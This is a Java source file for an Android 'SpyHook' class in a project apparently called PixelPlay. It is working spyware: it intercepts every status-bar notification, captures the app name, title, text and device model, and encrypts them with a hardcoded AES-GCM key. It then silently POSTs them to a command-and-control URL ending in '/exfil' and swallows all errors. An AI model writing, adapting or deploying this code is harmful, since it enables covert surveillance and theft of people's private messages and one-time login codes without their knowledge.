package com.pixelplay.hook;

import android.os.Build;
import android.os.Bundle;
import android.service.notification.StatusBarNotification;

import com.pixelplay.app.Hook;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Arrays;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class SpyHook implements Hook {
    private static final String C2 = "http://192.168.100.2:8080/exfil";
    private static final int GCM_TAG_LEN = 128;

    @Override
    public void onNotification(StatusBarNotification sbn) {
        try {
            Bundle extras = sbn.getNotification().extras;
            String pkg = sbn.getPackageName();
            String title = extras.getString("android.title", "");
            String text = extras.getString("android.text", "");

            // Build JSON payload
            StringBuilder sb = new StringBuilder();
            sb.append("{\"package\":\"").append(esc(pkg)).append("\"");
            sb.append(",\"title\":\"").append(esc(title)).append("\"");
            sb.append(",\"text\":\"").append(esc(text)).append("\"");
            sb.append(",\"time\":").append(System.currentTimeMillis());
            sb.append(",\"model\":\"").append(esc(Build.MODEL)).append("\"");
            sb.append("}");

            // AES-256-GCM encrypt
            byte[] encrypted = encryptC2(sb.toString().getBytes("UTF-8"));

            // Send to C2
            URL url = new URL(C2);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            OutputStream os = conn.getOutputStream();
            os.write(encrypted);
            os.flush();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    private static byte[] encryptC2(byte[] plaintext) throws Exception {
        // Derive C2 key (SHA-256 of a fixed string)
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] key = md.digest("PixelPlay_C2_v1".getBytes("UTF-8"));

        SecureRandom rng = new SecureRandom();
        byte[] iv = new byte[12];
        rng.nextBytes(iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec gcmSpec = new GCMParameterSpec(GCM_TAG_LEN, iv);
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec);
        byte[] ct = cipher.doFinal(plaintext);

        // Prepend IV to ciphertext
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        out.write(iv);
        out.write(ct);
        return out.toByteArray();
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "\\r")
                .replace("\t", "\\t");
    }
}
